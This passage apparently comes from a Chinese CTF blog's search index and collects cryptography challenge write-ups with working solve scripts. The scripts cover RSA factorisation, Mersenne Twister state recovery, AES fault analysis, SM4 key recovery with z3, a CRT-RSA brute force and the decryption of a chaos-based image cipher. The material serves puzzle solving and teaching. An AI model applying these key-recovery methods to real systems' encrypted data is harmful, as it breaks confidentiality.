83876349443792695800858107026041183982320923732817788196403038436907852045968678032744364820591254653790102051548732974272946672219653204468640915315703578520430635535892870037920414827506578157530920987388471203455357776260856432484054297100045972527097719870947170053306375598308878558204734888246779716599 x = 4700741767515367755988979759237706359789790281090690245800324350837677624645184526110027943983952690246679445279368999008839183406301475579349891952257846 a,b = getab(n,x,lenth) from icecream import * ic(a,b) 倒序exp\ndef get_cd(n,x,lenth): p_low = [0] q_high = [0] q_low = [0] p_high = [0] # maskn = 2 maskn = 0 for i in range(lenth//2): maskn = 2**(i+1)-1 xi = (x \u0026gt;\u0026gt; i )\u0026amp;1 n_lowbits = (n \u0026amp; maskn) # 高位判断从lenth-1处开始 High_index = lenth-1 -i XHi = (x \u0026gt;\u0026gt; (High_index))\u0026amp;1 n_highbits = (n)\u0026gt;\u0026gt; (High_index) *2 nextP_l = [] nextQ_l = [] nextP_h =[] nextQ_h =[] for j in range(len(p_low)): for pl in range(2): for ql in range(2): for ph in range(2): for qh in range(2): if pl ^ qh == xi and ql ^ ph == XHi: PlxQl = (((pl\u0026lt;\u0026lt;i) + p_low[j]) * ((ql\u0026lt;\u0026lt;i) + q_low[j])) \u0026amp; maskn PhxQh = (((ph \u0026lt;\u0026lt; (High_index)) + p_high[j]) * ((qh \u0026lt;\u0026lt; (High_index)) + q_high[j]))\u0026gt;\u0026gt;(High_index)*2 if PlxQl == n_lowbits : # if n_highbits-PhxQh \u0026gt;= 0 and n_highbits-PhxQh \u0026lt;=((2\u0026lt;\u0026lt;i+1)-1) # 高n位的差在 2^(i+1)-1以内是 高位相同的必要条件 if n_highbits-PhxQh \u0026gt;= 0 and n_highbits-PhxQh \u0026lt;=((2\u0026lt;\u0026lt;i+1)-1): nextP_l.append((pl\u0026lt;\u0026lt;i) + p_low[j]) nextQ_l.append((ql\u0026lt;\u0026lt;i) + q_low[j]) nextP_h.append((ph\u0026lt;\u0026lt;(High_index))+p_high[j]) nextQ_h.append((qh\u0026lt;\u0026lt;(High_index))+q_high[j]) p_low = nextP_l q_low = nextQ_l p_high = nextP_h q_high = nextQ_h for a in p_low: for b in p_high: if n %(a+b) ==0: p = a + b q = n//p print(p,q) break n2 = 65288148454377101841888871848806704694477906587010755286451216632701868457722848139696036928561888850717442616782583309975714172626476485483361217174514747468099567870640277441004322344671717444306055398513733053054597586090074921540794347615153542286893272415931709396262118416062887003290070001173035587341 x2 =3604386688612320874143532262988384562213659798578583210892143261576908281112223356678900083870327527242238237513170367660043954376063004167228550592110478 lenth = 512 get_cd(n2,x2,lenth) # ic(p,q) 稍微改了一下原p阴间的位运算\nn1ctf2021 # 咕咕咕了好久\nvss # 难点在随机数预测上面 先使用了一个二维码生成\nqr = qrcode.QRCode( version=1, error_correction=qrcode.constants.ERROR_CORRECT_L, box_size=12, border=4, ) qr.add_data(FLAG) qr.make(fit=True) img = qr.make_image(fill_color=\u0026#34;black\u0026#34;, back_color=\u0026#34;white\u0026#34;) RGB = 0xffffff 是白色\nRGB = 0 是黑色\n在填充像素时\n当 pixel !=255 时填充在 2x, 2y 的 color会不一样\n若能获得一大段连续的一样的pixel ，只要通过判断n个连续 color0 / color1的值就可以恢复出随机数MT9937的当前状态，不管是向前还是向后推都可以得到加密图片使用的随机数\nif pixel: ... else: share1.putpixel((2*x, 2*y), color0) share1.putpixel((2*x, 2*y+1), color0) ... share2.putpixel((2*x, 2*y), color1) share2.putpixel((2*x, 2*y+1), color1) ... exp\nfrom PIL import Image from randcrack import RandCrack import random share = Image.open(\u0026#39;./share2.png\u0026#39;) width = share.size[0]//2 res = Image.new(\u0026#39;L\u0026#39;, (width, width)) bits = \u0026#39;\u0026#39; # pixel为1填充0 # pixel为0填充1 # 01分别对应的是黑色的填充和白色的背景像素 # 官p取最后一段连续白色 for idx in range(width*width-624*32, width*width): i, j = idx//width, idx % width if share.getpixel((2*j, 2*i)) == 255: bits += \u0026#39;0\u0026#39; else: bits += \u0026#39;1\u0026#39; # 判断像素后 rc = RandCrack() for i in range(len(bits), 0, -32): rc.submit(int(bits[i-32:i], 2)) flipped_coins = [int(bit) for bit in bin(rc.predict_getrandbits(width*width-624*32))[2:].zfill(width*width-624*32)] + list(map(int, bits)) data = [] for idx in range(width*width): i, j = idx//width, idx % width if share.getpixel((2*j, 2*i)) == 255: data.append(0 if flipped_coins[idx] else 255) else: data.append(255 if flipped_coins[idx] else 0) res.putdata(data) res.save(\u0026#39;ans.png\u0026#39;) CISCN 2021 oddaes # 标准的远古时代的aes差分分析，做出来的估计互通有无得比较厉害\n市面上能搜到的aes差分脚本有三种，只有一种是专门针对这个题的\n能现学现找到的都是智商160+的超人😅😅😅\n感谢ChaMd5让本菜鸡学习了该脚本的用法\n暂且不论为什么社会安全团体会参加大学生赛事\nDifferential Fault Analysis（DFA） # 先来简单了解一下FDA是个啥\nDifferential fault analysis (DFA) is a type of active side-channel attack in the field of cryptography, specifically cryptanalysis. The principle is to induce faults—unexpected environmental conditions—into cryptographic implementations, to reveal their internal states.\nFor example, a smartcard containing an embedded processor might be subjected to high temperature, unsupported supply voltage or current, excessively high overclocking, strong electric or magnetic fields, or even ionizing radiation to influence the operation of the processor. The processor may begin to output incorrect results due to physical data corruption, which may help a cryptanalyst deduce the instructions that the processor is running, or what its internal data state is.\nFor DES and Triple DES, about 200 single-flipped bits are necessary to obtain a secret key.DFA was also applied successfully to the AES cipher.\n简单地说就是向密码系统内引入一定的错误，体现为加入以下细小的变化，使其与标准加密相比会有所不同。\n实验情况为手动加入错误，现实情况可能是由天气温度等物理因素导致的以外情况\n对des、3des而言约两百个单翻转位就足以获取到其密钥\n可以理解为我们使用两套不一样的加密系统加密了同一套明文，而两套加密系统的不同是已知的且微小的，通过对密文分析，有几率得到密钥\nanalysis and implement # https://eprint.iacr.org/2009/575.pdf\nAbstract. In this paper we present a differential fault attack that can be applied to the AES using a single fault. We demonstrate that when a single random byte fault is induced at the input of the eighth round, the AES key can be deduced using a two stage algorithm.\n在这篇文章中介绍了针对第八轮的输入中引发单个随机字节错误时，可以使用两阶段算法推导出 AES 密钥的算法（其实后面正式attack👴一个字都没看）\nConclusion\nthese attacks can be conducted without any knowledge of the plaintext being enciphered, as an attacker would just need to know the plaintexts were the same\n好了，那么我们可以发现题目给出的情况和论文中的情况是一模一样的🙄🙄🙄\ndef encrypt_block(self, plaintext): \u0026#34;\u0026#34;\u0026#34; Encrypts a single block of 16 byte long plaintext. \u0026#34;\u0026#34;\u0026#34; assert len(plaintext) == 16 plain_state = bytes2matrix(plaintext) add_round_key(plain_state, self._key_matrices[0]) for i in range(1, self.n_rounds): sub_bytes(plain_state) shift_rows(plain_state) mix_columns(plain_state) add_round_key(plain_state, self._key_matrices[i]) sub_bytes(plain_state) shift_rows(plain_state) add_round_key(plain_state, self._key_matrices[-1]) return matrix2bytes(plain_state) def encrypt_block_(self, plaintext,bytee): \u0026#34;\u0026#34;\u0026#34; Encrypts a single block of 16 byte long plaintext. \u0026#34;\u0026#34;\u0026#34; assert len(plaintext) == 16 plain_state = bytes2matrix(plaintext) add_round_key(plain_state, self._key_matrices[0]) for i in range(1, self.n_rounds): # 故意在第八轮中手动加入了差错。。。。 if i==8: plain_state[0][0] ^= bytee sub_bytes(plain_state) shift_rows(plain_state) mix_columns(plain_state) add_round_key(plain_state, self._key_matrices[i]) sub_bytes(plain_state) shift_rows(plain_state) add_round_key(plain_state, self._key_matrices[-1]) keym = self._key_matrices[-1] return matrix2bytes(plain_state),keym[0]+keym[1]+keym[2]+keym[3] https://github.com/Daeinar/dfa-aes\n直接把这个库里面的example1的input-1.csv两段密文换成题目给出的密文就可以得到一堆matter keys，把所有matter keys拿进去遍历就得到key了\ncsv的文件结构和txt基本一样\nfrom aes import AES import os,hashlib,random from tqdm import tqdm # ----------------------------------- f = open(\u0026#39;keys-0.csv\u0026#39;,\u0026#39;r\u0026#39;) plain = os.urandom(16) m1 = \u0026#39;973f5ae78bc933a8fc7f7ab98d53d16f\u0026#39; m2 = \u0026#39;628aab012199cdab83cc1aa72204ea98\u0026#39; s = random.randint(0,255) for i in tqdm(range(4266)): key = f.readline().replace(\u0026#39;\\n\u0026#39;,\u0026#39;\u0026#39;) cipher,k = AES(bytes.fromhex(key)).encrypt_block_(plain,s) piece1 = [k[0],k[1],k[4],k[7],k[10],k[11],k[13],k[14]] m11 = hashlib.md5(bytes(piece1)).hexdigest() piece2 = [k[2],k[3],k[5],k[6],k[8],k[9],k[12],k[15]] m22 = hashlib.md5(bytes(piece2)).hexdigest() if m11 == m1 and m22 == m2: print(key) print(\u0026#34;CISCN{\u0026#34;+hashlib.md5(bytes.fromhex(key)).hexdigest()+\u0026#34;}\u0026#34;) break 癫疯极客2021补档 7-31 # 东拼西凑把wp凑齐了🙄\nlearnSM4 # SM4采用和aes完全不同的结构\n列如在第一轮中，使用原有明文生$X_0X_1X_2X_3$成新的明文$X_4$\n在$n$轮后选取最后四个$X$作为密文\n这里故意加入leak可以在第一轮和第二轮泄露用$X_0X_1X_2X_3$生成的$X_4$\ndef _crypthack(num, mk, rou,index): x_keys = list(_byte_unpack(num, byte_n=16)) round_keys = _round_keys(mk) leak = 0 for i in _range(32): reg = _round_f(x_keys[i:i+4], round_keys[i]) x_keys.append(reg) # use x0123 get x4 reg = _byte_unpack(reg) if i == rou: leak = reg[index] return _byte_pack(x_keys[-4:][::-1], byte_n=16),leak 生成公式如下\n$X_4=repT(X_1\\oplus X_2\\oplus X_3\\oplus roundKey)$\ndef _round_f(byte4_array, rk): x0, x1, x2, x3 = byte4_array print(x0, x1, x2, x3) return x0 ^ _rep_t(x1 ^ x2 ^ x3 ^ rk) 也就是说找到$repT$的逆算法就能求roundKey[0]了\n然后就陷入了僵局。。写半天局部爆破每弄出来\n事后发现有人用z3直接梭哈。。。\n构造$X_4=1\\oplus repT(0\\oplus 0\\oplus 0\\oplus roundKey)$\n依次输入r = 0 i=0~3 msg=0000001000000000000000000000000\nimport z3 S_BOX = { 0X00: 0XD6, 0X01: 0X90, 0X02: 0XE9, 0X03: 0XFE, 0X04: 0XCC, 0X05: 0XE1, 0X06: 0X3D, 0X07: 0XB7, 0X08: 0X16, 0X09: 0XB6, 0X0A: 0X14, 0X0B: 0XC2, 0X0C: 0X28, 0X0D: 0XFB, 0X0E: 0X2C, 0X0F: 0X05, 0X10: 0X2B, 0X11: 0X67, 0X12: 0X9A, 0X13: 0X76, 0X14: 0X2A, 0X15: 0XBE, 0X16: 0X04, 0X17: 0XC3, 0X18: 0XAA, 0X19: 0X44, 0X1A: 0X13, 0X1B: 0X26, 0X1C: 0X49, 0X1D: 0X86, 0X1E: 0X06, 0X1F: 0X99, 0X20: 0X9C, 0X21: 0X42, 0X22: 0X50, 0X23: 0XF4, 0X24: 0X91, 0X25: 0XEF, 0X26: 0X98, 0X27: 0X7A, 0X28: 0X33, 0X29: 0X54, 0X2A: 0X0B, 0X2B: 0X43, 0X2C: 0XED, 0X2D: 0XCF, 0X2E: 0XAC, 0X2F: 0X62, 0X30: 0XE4, 0X31: 0XB3, 0X32: 0X1C, 0X33: 0XA9, 0X34: 0XC9, 0X35: 0X08, 0X36: 0XE8, 0X37: 0X95, 0X38: 0X80, 0X39: 0XDF, 0X3A: 0X94, 0X3B: 0XFA, 0X3C: 0X75, 0X3D: 0X8F, 0X3E: 0X3F, 0X3F: 0XA6, 0X40: 0X47, 0X41: 0X07, 0X42: 0XA7, 0X43: 0XFC, 0X44: 0XF3, 0X45: 0X73, 0X46: 0X17, 0X47: 0XBA, 0X48: 0X83, 0X49: 0X59, 0X4A: 0X3C, 0X4B: 0X19, 0X4C: 0XE6, 0X4D: 0X85, 0X4E: 0X4F, 0X4F: 0XA8, 0X50: 0X68, 0X51: 0X6B, 0X52: 0X81, 0X53: 0XB2, 0X54: 0X71, 0X55: 0X64, 0X56: 0XDA, 0X57: 0X8B, 0X58: 0XF8, 0X59: 0XEB, 0X5A: 0X0F, 0X5B: 0X4B, 0X5C: 0X70, 0X5D: 0X56, 0X5E: 0X9D, 0X5F: 0X35, 0X60: 0X1E, 0X61: 0X24, 0X62: 0X0E, 0X63: 0X5E, 0X64: 0X63, 0X65: 0X58, 0X66: 0XD1, 0X67: 0XA2, 0X68: 0X25, 0X69: 0X22, 0X6A: 0X7C, 0X6B: 0X3B, 0X6C: 0X01, 0X6D: 0X21, 0X6E: 0X78, 0X6F: 0X87, 0X70: 0XD4, 0X71: 0X00, 0X72: 0X46, 0X73: 0X57, 0X74: 0X9F, 0X75: 0XD3, 0X76: 0X27, 0X77: 0X52, 0X78: 0X4C, 0X79: 0X36, 0X7A: 0X02, 0X7B: 0XE7, 0X7C: 0XA0, 0X7D: 0XC4, 0X7E: 0XC8, 0X7F: 0X9E, 0X80: 0XEA, 0X81: 0XBF, 0X82: 0X8A, 0X83: 0XD2, 0X84: 0X40, 0X85: 0XC7, 0X86: 0X38, 0X87: 0XB5, 0X88: 0XA3, 0X89: 0XF7, 0X8A: 0XF2, 0X8B: 0XCE, 0X8C: 0XF9, 0X8D: 0X61, 0X8E: 0X15, 0X8F: 0XA1, 0X90: 0XE0, 0X91: 0XAE, 0X92: 0X5D, 0X93: 0XA4, 0X94: 0X9B, 0X95: 0X34, 0X96: 0X1A, 0X97: 0X55, 0X98: 0XAD, 0X99: 0X93, 0X9A: 0X32, 0X9B: 0X30, 0X9C: 0XF5, 0X9D: 0X8C, 0X9E: 0XB1, 0X9F: 0XE3, 0XA0: 0X1D, 0XA1: 0XF6, 0XA2: 0XE2, 0XA3: 0X2E, 0XA4: 0X82, 0XA5: 0X66, 0XA6: 0XCA, 0XA7: 0X60, 0XA8: 0XC0, 0XA9: 0X29, 0XAA: 0X23, 0XAB: 0XAB, 0XAC: 0X0D, 0XAD: 0X53, 0XAE: 0X4E, 0XAF: 0X6F, 0XB0: 0XD5, 0XB1: 0XDB, 0XB2: 0X37, 0XB3: 0X45, 0XB4: 0XDE, 0XB5: 0XFD, 0XB6: 0X8E, 0XB7: 0X2F, 0XB8: 0X03, 0XB9: 0XFF, 0XBA: 0X6A, 0XBB: 0X72, 0XBC: 0X6D, 0XBD: 0X6C, 0XBE: 0X5B, 0XBF: 0X51, 0XC0: 0X8D, 0XC1: 0X1B, 0XC2: 0XAF, 0XC3: 0X92, 0XC4: 0XBB, 0XC5: 0XDD, 0XC6: 0XBC, 0XC7: 0X7F, 0XC8: 0X11, 0XC9: 0XD9, 0XCA: 0X5C, 0XCB: 0X41, 0XCC: 0X1F, 0XCD: 0X10, 0XCE: 0X5A, 0XCF: 0XD8, 0XD0: 0X0A, 0XD1: 0XC1, 0XD2: 0X31, 0XD3: 0X88, 0XD4: 0XA5, 0XD5: 0XCD, 0XD6: 0X7B, 0XD7: 0XBD, 0XD8: 0X2D, 0XD9: 0X74, 0XDA: 0XD0, 0XDB: 0X12, 0XDC: 0XB8, 0XDD: 0XE5, 0XDE: 0XB4, 0XDF: 0XB0, 0XE0: 0X89, 0XE1: 0X69, 0XE2: 0X97, 0XE3: 0X4A, 0XE4: 0X0C, 0XE5: 0X96, 0XE6: 0X77, 0XE7: 0X7E, 0XE8: 0X65, 0XE9: 0XB9, 0XEA: 0XF1, 0XEB: 0X09, 0XEC: 0XC5, 0XED: 0X6E, 0XEE: 0XC6, 0XEF: 0X84, 0XF0: 0X18, 0XF1: 0XF0, 0XF2: 0X7D, 0XF3: 0XEC, 0XF4: 0X3A, 0XF5: 0XDC, 0XF6: 0X4D, 0XF7: 0X20, 0XF8: 0X79, 0XF9: 0XEE, 0XFA: 0X5F, 0XFB: 0X3E, 0XFC: 0XD7, 0XFD: 0XCB, 0XFE: 0X39, 0XFF: 0X48 } def getnum(arr): HEX = \u0026#39;\u0026#39; for i in arr: HEX += hex(i)[2:] return int(HEX,16) # 用z3逆T变换中的r(x) def f(B): B1 = (((B \u0026lt;\u0026lt; 2 ) \u0026amp; 0b1100000000000000000000000000000000) \u0026gt;\u0026gt;32) ^ (B \u0026lt;\u0026lt; 2) \u0026amp; 0xffffffff B2 = (((B \u0026lt;\u0026lt; 10) \u0026amp; 0b111111111100000000000000000000000000000000) \u0026gt;\u0026gt; 32) ^ (B\u0026lt;\u0026lt;10) \u0026amp; 0xffffffff B3 = (((B \u0026lt;\u0026lt; 18) \u0026amp; 0b11111111111111111100000000000000000000000000000000) \u0026gt;\u0026gt; 32) ^ (B\u0026lt;\u0026lt;18) \u0026amp; 0xffffffff B4 = (((B \u0026lt;\u0026lt; 24) \u0026amp; 0b11111111111111111111111100000000000000000000000000000000) \u0026gt;\u0026gt; 32) ^ (B\u0026lt;\u0026lt;24) \u0026amp; 0xffffffff return B ^ B1 ^ B2 ^ B3 ^ B4 S = z3.Solver() x = z3.BitVec(\u0026#39;x\u0026#39;,64) # 四次获取的x4 S.add((getnum([173,171,64,87])^1)- f(x)==0) if S.check(): print(S.model()) # [x = 2810370552] print(hex(2810370552)[2:]) # 0x842586b9 key = \u0026#39;0\u0026#39; arr = [0xa7,0x82,0xd9,0xf8] for i in arr: key += hex(findS(i))[2:] print(int(key,16)) crtrsa # 没这么看这个，看完wp的爆破感觉智商收到了侮辱。。\nfrom gmpy2 import * from Crypto.Util.number import * from tqdm import tqdm from rich.progress import track from rich.traceback import install install() # ----------------------------------- N = 6006128121276172470274143101473619963750725942458450119252491144009018469845917986523007748831362674341219814935241703026024431390531323127620970750816983 e = 2953544268002866703872076551930953722572317122777861299293407053391808199220655289235983088986372630141821049118015752017412642148934113723174855236142887 c=4082777468662493175049853412968913980472986215497247773911290709560282223053863513029985115855416847643274608394467813391117463817805000754191093158289399 a=2 A=powmod(a,e,N) for dp in tqdm(range(1,2**20)): if gcd(powmod(A,dp,N)-a,N)!=1 and gcd(powmod(A,dp,N)-a,N)!=N: p=gcd(pow(A,dp,N)-a,N) q=N//p phi=(p-1)*(q-1) d=invert(e,phi) m=pow(c,d,N) print(long_to_bytes(m)) break 抄，我疯狂抄\n","date":"9 August 2021","permalink":"/achieve/%E5%A4%8D%E7%9B%981/","section":"archive","summary":"","title":"闲题杂记"},{"content":"采用的原因：早期的图像加密方法主要基于现有的数据加密技术，如DES、AES等。然而，由于图像本身的固有特性，这些方法的效率和抗攻击能力都较弱。近年来，基于混沌的图像加密方法越来越受到重视。与传统的非混沌图像加密相比，基于混沌的图像加密具有密钥空间大、速度快、易于实现等优点\n图像文件加密与普通文件加密的不同之处在于，图像相邻像素之间通常存在着比较大的相关性，对图像加密不仅要使图像变得不可识别，还要尽可能地减小相邻像素之间的相关性。\n虫口模型 Logistic 混沌映射 # 如果一个系统的演变过程对初始的状态十分敏感，就把这个系统称为是混沌系统。\n在本文中，我们主要探讨一维Logistic映射的一些特性\n一维Logistic映射从数学形式上来看是一个非常简单的混沌映射，早在20世纪50年代，有好几位生态学家就利用过这个简单的差分方程，来描述种群的变化。此系统具有极其复杂的动力学行为，在保密通信领域的应用十分广泛，其数学表达公式如下：\n$X_{n+1}=X_n \\times \\mu \\times (1-X_n)$\n$\\mu \\in[0,4];X\\in[0,1]$\n其中$\\mu$被称为Logistic参数。研究表明，当$X\\in[0,1]$时，Logistic 映射工作处于混沌状态，\n也就是说，有初始条件$X_n$在Logistic映射作用下产生的序列是非周期的、不收敛的，而在此范围之外，生成的序列必将收敛于某一个特定的值\n可以看出，在μ的取值符合3.5699456\u0026lt;μ\u0026lt;=4的条件，特别是比较靠近4时，迭代生成的值是出于一种伪随机分布的状态，而在其他取值时，在经过一定次数的迭代之后，生成的值将收敛到一个特定的数值，这对于我们来说是不可接受的。\n下图中描述了X0值一定时，对于不同的μ的取值，迭代可能得到的值：\n图中的点即表明了所有可能的X取值范围。从图中我们可以看出，在μ越接近4的地方，X取值范围越是接近平均分布在整个0到1的区域，因此我们需要选取的Logistic控制参数应该越接近4越好。当3.5699456\u0026hellip;\u0026lt;μ≤43.5699456\u0026hellip;\u0026lt;μ≤4时，映射进入混沌(chaos)区域。Logistic映射分岔图像如图1所示。现在这类模型是人们最常见的，更是广为使用的。\n在μ的值确定之后，我们再来看看初始值X0对整个系统的影响。刚才也说过了，混沌系统在初始值发生很小变化时，得到的结构就会大相径庭，在Logistic混沌映射中也是如此。\n一种像素灰度值替代设计图像加密 # 设图像$(i,j)$处的灰度值为 $I(i,j)$,$I\u0026rsquo;(i,j)$表示替换后的值\n本文中，像素值的替代变换是在空域中进行的，一般，设计了两种思路用于实现混沌序列与像素值的替换操作。\n$I′(i,j)=((r1(i,j)⊕I(i,j)⊕r2(i,j)+L−r3(i,j)));mod;L);mod;256$\n$L$表示图像的颜色深度\n$r1,r2,r3$表示的是混沌序列值，替换变换的密钥由$r1,r2,r3$对应的混沌系统提供，变换可多次进行，如此加密效果更好。设重复次数为 n ，与混沌模型的初值和参数共同作为这一部分的密钥，增大了密钥的空间\n若图像很大时，通过上式能够看出r1,r2,r3模版矩阵需要随之增大，如此就大大减小了加密效率。为此，我们可以通过分块处理的方式对图像进行加密，加密效率明显提高。图2是原始图像和加密后的图像:\n混沌理论Chaos theory # Chaos theory is a branch of mathematics focusing on the study of chaos — dynamical systems whose apparently random states of disorder and irregularities are actually governed by underlying patterns and deterministic laws that are highly sensitive to initial conditions\n大意是混沌系统是数学的一个分支\n这里利用一些自然中对初始条件及其敏感的模型来输出加密序列？\n","date":"31 July 2021","permalink":"/achieve/2019to2021/chaostc/","section":"archive","summary":"","title":"Chaos encrypt system"},{"content":"\r癫疯极客 # 阿猫阿狗们拼上爹妈追赶evoa\n最后一分钟大家垂直上分的样子真的很靓仔\nMedicalImage # 混沌加密系统，一种针对图像的加密系统\n主要按照Logistic 模型来构造迭代函数\n$\\mu$选取最大值4\ndef f1(x): # It is based on logistic map in chaotic systems # The parameter r takes the largest legal value assert(x\u0026gt;=0) assert(x\u0026lt;=1) r = 4 return x*r*(1-x) 然后把encrypt的逆算法写出来就行了\np0 = random.randint(100,104) c0 = random.randint(200,204) 这两个随机数随便取一个范围内的\n对解密没有影响\nexp # from PIL import Image from icecream import * from decimal import * import numpy as np import random getcontext().prec = 20 def f1(x): assert(x\u0026gt;=0) assert(x\u0026lt;=1) r = 4 return x*r*(1-x) def f2(x): assert(x\u0026gt;=0) assert(x\u0026lt;=1) r = 4 return x*r*(1-x) def f3(x): r = 4 return x*r*(1-x) # get data1 im = Image.open(\u0026#39;flag_enc.bmp\u0026#39;) size = im.size pixels = im.load() w,h = size[0],size[1] pic=[[0 for _ in range(w)] for __ in range(h)] for i in range(w): for j in range(h): pic[j][i]=pixels[i,j] r1 = Decimal(\u0026#39;0.478706063089473894123\u0026#39;) r2 = Decimal(\u0026#39;0.613494245341234672318\u0026#39;) r3 = Decimal(\u0026#39;0.946365754637812381837\u0026#39;) w,h = size for i in range(200): r1 = f1(r1) r2 = f2(r2) r3 = f3(r3) const = 10**14 # 先对 R3 序列打表 p0 = 102 c0 = 202 # print(pic[0]) # input() for x in range(w): for y in range(h): k = int(round(const*r3))%256 k = bin(k)[2:].ljust(8,\u0026#39;0\u0026#39;) k = int(k[p0%8:]+k[:p0%8],2) r3 = f3(r3) # print(k) # input() tmp=pic[y][x] p0 = ((tmp^c0^k)-k)%256 c0=tmp pic[y][x]=p0 # ===================== # p0 = pic[y][x] # c0 = k^((k+p0)%256)^c0 # pic[y][x] = c0 # print(pic[0]) XX=[] YY=[] X=[] Y=[] i=0 for x in range(w): for y in range(h): i+=1 x1 = int(round(const*r1))%w y1 = int(round(const*r2))%h XX.append(x1) YY.append(y1) r1 = f1(r1) r2 = f2(r2) i-=1 for x in range(w-1,-1,-1): for y in range(h-1,-1,-1): x1 = XX[i] y1 = YY[i] tmp = pic[y1][x1] pic[y1][x1] = pic[y][x] pic[y][x] = tmp i-=1 # print(i) # print(pic[0]) im = Image.new(\u0026#39;P\u0026#39;, size,\u0026#39;white\u0026#39;) flag = im.load() # print(w,h) # 650 114 for x in range(w): for y in range(h): flag[x,y] = pic[y][x] im.save(\u0026#39;output.bmp\u0026#39;) output.bmp # 明明很简单的一个题却浪费了一中午\n蚌埠住了😰😰😰\n","date":"31 July 2021","permalink":"/achieve/ctf/dfjk2021/","section":"archive","summary":"","title":"Writeup for MedicalImage in 癫疯geekCtf 2021"},{"content":" Refer:Intnet\n2021年中国能源网络安全大赛 # NumberGame # e=65537 (p-1)*(q-1)=15743369066365201538689815141217340316571238013087670610561037355773525976258683589473338312326667266426637983360891507450086948913791067841805124377899989037485326133436719169246977060981737084689604571176180431464103979969894191079926052092838806338413905561857239072404009236751128582547515118141940600672935405990869984053032765764114050729270669601890847900632843688927485888918612911073502700067125045327489296133801029104137634700096205588495179191062622618039322093662364377472003903899926787818853067801269953347284657645644433840226628368651915623156258190141632506503179281547840336415021260912890513317032 c=13751833349374257546209411135285092025488474108950873335024549274321086737456294175321120539754112475192176856842163702158437261396059826784892899176923534179915888282864428402789707026830116675021571701648882970445289856088711084812757925707567230381940631064097247655097898810731114605714274641284534967275121251913986394408892187726203752249533094374744765243723455319272657285557501695073422223837888223589541537218910163081228251946239816318853757555291276404517545168694257378212616960758914005374587905274292014917325205163653897110709086078591016724234778570715311198272084303656971117931256882498414761066763 invert(p,q)=63567214271914333094632899333841375147292062018298573854142802911053572390920700513290025348818998146731407276513819782906243535938082361025317768375133584131695102997533625569063205757115454077033715745425720243515047860316309615090852448819151555625882308478246810599114349379924606314715907857949899701531 invert(q,p)=61854206698188431209560015384356189028981002413118973294450748821388080621667741484068895416821294105003859720045449073339567340407545907381482535347338180766054184558875014806879520058753821268699806496142714025634827191809185242495912563928024605815219672974396270176683304596115075405856328836048144151507 给出 $(p-1)(q-1),x=\\text{inv}(p,q),y=\\text{inv}(q,p),e,c$。\n详细推导思路可参考 HITCON 2019 - Lost Modulus Again。\n解题脚本：\nimport gmpy2 from itertools import product import binascii from Crypto.Util.number import * \u0026#34;\u0026#34;\u0026#34; alpha = p\u0026#39; * q\u0026#39; - l beta = l^2 * [(e * d - 1) / s] + q\u0026#39; * l + p\u0026#39; * l - p\u0026#39; * q\u0026#39; - alpha - l^2 i.e.: beta = l^2 * {[(e * d - 1) / s] - 1} + l * (q\u0026#39; + p\u0026#39;) - alpha - p\u0026#39; * q\u0026#39; if l,s are correct: alpha = k * t beta = k * (p\u0026#39; - l) + t * (q\u0026#39; - l) i.e: \u0026#34;\u0026#34;\u0026#34; def alpha_from_pprime_qprime_l(pprime, qprime, l): return pprime*qprime - l def beta_from_pprime_qprime_e_d_l_s_alpha(pprime, qprime, e, d, l, s, alpha): temp1 = e*d - 1 assert temp1 % s == 0 temp2 = ((temp1 // s) - 1) * l * l temp3 = temp2 + l * (pprime + qprime) return temp3 - alpha - (pprime*qprime) def k_t_from_pprime_qprime_l_alpha_beta(pprime, qprime, l, alpha, beta): a = pprime - l b = -beta c = alpha * (qprime - l) disc = b * b - 4 * a * c assert gmpy2.is_square(disc) temp = -b + gmpy2.isqrt(disc) assert temp % (2*a) == 0 k = temp // (2*a) assert alpha % k == 0 return k, alpha // k def brute_k_t_l(pprime, qprime, e, d): # l, s = 2, 2 ss = [s for s in range(e - 100000, e + 1000000) if s!=0 and (e*d - 1) % s == 0] for l, s in product(range(1, 5000), ss): #print(f\u0026#39;l = {l}, s = {s}\u0026#39;) try: alpha = alpha_from_pprime_qprime_l(pprime, qprime, l) beta = beta_from_pprime_qprime_e_d_l_s_alpha(pprime, qprime, e, d, l, s, alpha) k, t = k_t_from_pprime_qprime_l_alpha_beta(pprime, qprime, l, alpha, beta) return k, t, l except AssertionError: continue if __name__ == \u0026#34;__main__\u0026#34;: e = 65537 fn = 15743369066365201538689815141217340316571238013087670610561037355773525976258683589473338312326667266426637983360891507450086948913791067841805124377899989037485326133436719169246977060981737084689604571176180431464103979969894191079926052092838806338413905561857239072404009236751128582547515118141940600672935405990869984053032765764114050729270669601890847900632843688927485888918612911073502700067125045327489296133801029104137634700096205588495179191062622618039322093662364377472003903899926787818853067801269953347284657645644433840226628368651915623156258190141632506503179281547840336415021260912890513317032 d = gmpy2.invert(e,fn) pprime = 63567214271914333094632899333841375147292062018298573854142802911053572390920700513290025348818998146731407276513819782906243535938082361025317768375133584131695102997533625569063205757115454077033715745425720243515047860316309615090852448819151555625882308478246810599114349379924606314715907857949899701531 qprime = 61854206698188431209560015384356189028981002413118973294450748821388080621667741484068895416821294105003859720045449073339567340407545907381482535347338180766054184558875014806879520058753821268699806496142714025634827191809185242495912563928024605815219672974396270176683304596115075405856328836048144151507 k, t, l = brute_k_t_l(pprime, qprime, e, d) lp, lq = qprime + k, pprime + t assert lp % l == 0, lq % l == 0 p, q = lp // l, lq // l assert gmpy2.invert(p, q) == pprime, gmpy2.invert(q, p) == qprime assert gmpy2.is_prime(p), gmpy2.is_prime(q) N = p*q c = 13751833349374257546209411135285092025488474108950873335024549274321086737456294175321120539754112475192176856842163702158437261396059826784892899176923534179915888282864428402789707026830116675021571701648882970445289856088711084812757925707567230381940631064097247655097898810731114605714274641284534967275121251913986394408892187726203752249533094374744765243723455319272657285557501695073422223837888223589541537218910163081228251946239816318853757555291276404517545168694257378212616960758914005374587905274292014917325205163653897110709086078591016724234778570715311198272084303656971117931256882498414761066763 flag_decoded = pow(c, d, N) print(long_to_bytes(flag_decoded)) #b\u0026#39;flag{dP_4nd_dQ_1s_4_exc1tlng_pr0bLEm}\u0026#39; FillTheBlank # 推公式？\nfrom Crypto.Util.number import * import gmpy2 import math a = 